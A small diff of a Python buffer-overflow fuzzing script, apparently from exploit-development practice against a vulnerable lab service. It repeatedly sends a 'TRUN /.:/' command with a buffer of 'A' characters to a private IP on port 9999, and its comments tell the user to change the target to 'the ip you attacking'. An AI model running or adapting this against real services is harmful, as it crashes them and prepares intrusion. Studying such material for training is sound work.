@@ -7,7 +7,7 @@ buffer = "A" * 100
 
 while True:
     try:
-        payload = "TRUN /.:/" + buffer
+        payload = "TRUN /.:/" + buffer #replace TRUN with the process
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('172.16.98.40',9999)) #change this to the ip you attacking
